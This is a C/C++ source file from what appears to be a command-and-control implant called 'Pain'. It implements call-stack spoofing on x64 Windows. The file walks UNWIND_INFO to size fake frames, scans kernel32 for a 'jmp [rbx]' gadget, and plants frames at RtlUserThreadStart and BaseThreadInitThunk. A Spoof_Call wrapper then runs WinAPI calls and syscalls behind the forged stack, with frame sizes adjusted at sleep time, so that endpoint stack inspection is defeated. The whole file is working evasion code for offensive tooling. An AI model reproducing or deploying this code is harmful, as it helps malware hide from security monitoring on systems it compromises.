#include <windows.h>
#include <Native.h>
#include <Agent.h>
#include <Defines.h>
#include <Internals.h>
#include <Spoof.h>

// local PE/unwind types
// Defined here to avoid dependency on SDK headers that may not be in mingw.

typedef struct _PAIN_RTF {
    DWORD BeginAddress;
    DWORD EndAddress;
    DWORD UnwindData;       // RVA to UNWIND_INFO
} PAIN_RTF;

typedef union _PAIN_UW_CODE {
    struct { BYTE CodeOffset; BYTE UnwindOp : 4; BYTE OpInfo : 4; };
    USHORT FrameOffset;
} PAIN_UW_CODE;

typedef struct _PAIN_UW_INFO {
    BYTE         Version     : 3;
    BYTE         Flags       : 5;
    BYTE         SizeOfProlog;
    BYTE         CountOfCodes;
    BYTE         FrameRegister : 4;
    BYTE         FrameOffset   : 4;
    PAIN_UW_CODE UnwindCode[1];
} PAIN_UW_INFO;

#define PAIN_UNW_FLAG_CHAIN  0x04

// UWOP constants (x64 only)
#define UW_PUSH_NONVOL     0
#define UW_ALLOC_LARGE     1
#define UW_ALLOC_SMALL     2
#define UW_SET_FPREG       3
#define UW_SAVE_NONVOL     4
#define UW_SAVE_NONVOL_FAR 5
#define UW_SAVE_XMM128     8
#define UW_SAVE_XMM128_FAR 9
#define UW_PUSH_MACHFRAME  10

// RtlLookupFunctionEntry function pointer type
// mingw's winnt.h declares it as returning PRUNTIME_FUNCTION; we cast to PAIN_RTF*
typedef PVOID (NTAPI *RlFE_t)(ULONG64, PULONG64, PVOID);  // matches at ABI level

// helpers

// Walk UNWIND_INFO and return the frame's total stack allocation in bytes.
// (return address slot + 16-byte align + 0x20 shadow space, capped at 0x1000)
static DECLFN ULONG_PTR WalkUnwind(ULONG_PTR RtmFunc, ULONG_PTR ImgBase)
{
    if (!RtmFunc || !ImgBase) return 0x30;

    auto* pf = (PAIN_RTF*)RtmFunc;
    auto* ui = (PAIN_UW_INFO*)(pf->UnwindData + ImgBase);

    if (ui->Version < 1 || ui->Version > 2) return 0x30;

    ULONG        total = 0;
    ULONG        cnt   = ui->CountOfCodes;
    PAIN_UW_CODE* uc   = ui->UnwindCode;

    for (ULONG i = 0; i < cnt; ) {
        BYTE op  = uc[i].UnwindOp;
        BYTE inf = uc[i].OpInfo;

        switch (op) {
            case UW_PUSH_NONVOL:
                total += 8; i++; break;

            case UW_ALLOC_LARGE:
                if (inf == 0) {
                    ++i;
                    total += (ULONG)uc[i].FrameOffset * 8;
                } else {
                    ULONG lo = uc[++i].FrameOffset;
                    ULONG hi = uc[++i].FrameOffset;
                    total += lo | (hi << 16);
                }
                i++; break;

            case UW_ALLOC_SMALL:
                total += (ULONG)(inf * 8) + 8; i++; break;

            case UW_SET_FPREG:
                i++; break;

            case UW_SAVE_NONVOL:
                i += 2; break;
            case UW_SAVE_NONVOL_FAR:
                i += 3; break;

            case UW_SAVE_XMM128:
                i += 2; break;
            case UW_SAVE_XMM128_FAR:
                i += 3; break;

            case UW_PUSH_MACHFRAME:
                total += inf ? (7 * 8) : (6 * 8); i++; break;

            default:
                total += 0x20; i++; break;
        }
    }

    // chained UNWIND_INFO: a RUNTIME_FUNCTION follows the unwind codes
    if (ui->Flags & PAIN_UNW_FLAG_CHAIN) {
        ULONG chain = cnt;
        if (chain & 1) chain++;
        auto* cf = (PAIN_RTF*)&ui->UnwindCode[chain];
        total += (ULONG)WalkUnwind((ULONG_PTR)cf, ImgBase);
    }

    total += sizeof(ULONG_PTR);        // return address slot
    total  = (total + 15) & ~15u;     // 16-byte align
    total += 0x20;                     // shadow space

    return (ULONG_PTR)((total < 0x1000) ? total : 0x1000);
}

// Compute frame size for a given return address using UNWIND_INFO.
// RlFE is the resolved RtlLookupFunctionEntry function pointer.
static DECLFN ULONG_PTR FrameSize(ULONG_PTR RetAddr, RlFE_t RlFE)
{
    if (!RetAddr || !RlFE) return 0x20;

    ULONG64 ImgBase = 0;
    PAIN_RTF* rf = (PAIN_RTF*)RlFE((ULONG64)RetAddr, &ImgBase, nullptr);
    if (!rf) return 0x20;

    return WalkUnwind((ULONG_PTR)rf, (ULONG_PTR)ImgBase);
}

// Scan the first .text* section of a loaded PE image for `jmp [rbx]` (FF 23).
static DECLFN ULONG_PTR FindGadget(ULONG_PTR ModBase)
{
    if (!ModBase) return 0;

    auto* dos = (IMAGE_DOS_HEADER*)ModBase;
    auto* nt  = (IMAGE_NT_HEADERS64*)(ModBase + dos->e_lfanew);
    auto* sec = (IMAGE_SECTION_HEADER*)
                    ((BYTE*)&nt->OptionalHeader + nt->FileHeader.SizeOfOptionalHeader);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        // match .text (first 5 chars)
        if (!(sec->Name[0] == '.' && sec->Name[1] == 't' &&
              sec->Name[2] == 'e' && sec->Name[3] == 'x' &&
              sec->Name[4] == 't'))
            continue;

        auto* data = (BYTE*)(ModBase + sec->VirtualAddress);
        ULONG size  = sec->Misc.VirtualSize;

        for (ULONG j = 0; j + 1 < size; j++) {
            if (data[j] == 0xFF && data[j + 1] == 0x23)
                return (ULONG_PTR)(data + j);
        }
    }
    return 0;
}

// public API

// Spoof_Init: populate Self->Spf.Setup once during Agent::Init().
// Must be called after Ntdll and Krnl32 are resolved.
DECLFN void Spoof_Init()
{
    G_AGENT;

    auto RlFE = (RlFE_t)Self->Ntdll.RtlLookupFunctionEntry;

    // anchor frame addresses (+offset lands inside the function body so
    // RtlLookupFunctionEntry finds the right RUNTIME_FUNCTION)
    Self->Spf.Setup.First.Ptr  = (ULONG_PTR)Self->Ntdll.RtlUserThreadStart  + 0x21;
    Self->Spf.Setup.Second.Ptr = (ULONG_PTR)Self->Krnl32.BaseThreadInitThunk + 0x14;

    Self->Spf.Setup.First.Size  = FrameSize(Self->Spf.Setup.First.Ptr,  RlFE);
    Self->Spf.Setup.Second.Size = FrameSize(Self->Spf.Setup.Second.Ptr, RlFE);

    // find gadget and compute its frame size; retry if FrameSize returns 0
    do {
        Self->Spf.Setup.Gadget.Ptr  = FindGadget(Self->Krnl32.Handle);
        Self->Spf.Setup.Gadget.Size = FrameSize(Self->Spf.Setup.Gadget.Ptr, RlFE);
    } while (!Self->Spf.Setup.Gadget.Size);

    Self->Spf.Setup.ArgCount = 12;

    // Sleep-time frame sizes: strip the 0x20 SpoofCall padding so they match
    // what the real UNWIND_INFO-based stack walker computes.
    Self->Spf.Setup.SleepFsFirst  = Self->Spf.Setup.First.Size  - 0x20;
    Self->Spf.Setup.SleepFsSecond = Self->Spf.Setup.Second.Size - 0x20;
    Self->Spf.Setup.SleepFsGadget = Self->Spf.Setup.Gadget.Size - 0x20;

    Self->Ntdll.DbgPrint(
        "[Pain] Spoof_Init: First=%p(%llu) Second=%p(%llu) Gadget=%p(%llu)\n",
        (PVOID)Self->Spf.Setup.First.Ptr,  (ULONG64)Self->Spf.Setup.First.Size,
        (PVOID)Self->Spf.Setup.Second.Ptr, (ULONG64)Self->Spf.Setup.Second.Size,
        (PVOID)Self->Spf.Setup.Gadget.Ptr, (ULONG64)Self->Spf.Setup.Gadget.Size
    );
}

// Spoof_Call: wrap any NT/WinAPI call with a spoofed call stack.
//   Fnc  - target function address
//   Ssn  - syscall number (0 for plain WinAPI / indirect syscall not used)
//   a1..a12 - up to 12 arguments passed through to the target
DECLFN ULONG_PTR Spoof_Call(
    ULONG_PTR Fnc, ULONG_PTR Ssn,
    ULONG_PTR a1,  ULONG_PTR a2,  ULONG_PTR a3,  ULONG_PTR a4,
    ULONG_PTR a5,  ULONG_PTR a6,  ULONG_PTR a7,  ULONG_PTR a8,
    ULONG_PTR a9,  ULONG_PTR a10, ULONG_PTR a11, ULONG_PTR a12
) {
    G_AGENT;
    Self->Spf.Setup.Ssn = Ssn;
    return SpoofCall(
        a1, a2, a3, a4,
        Fnc, (ULONG_PTR)&Self->Spf.Setup,
        a5, a6, a7, a8, a9, a10, a11, a12
    );
}
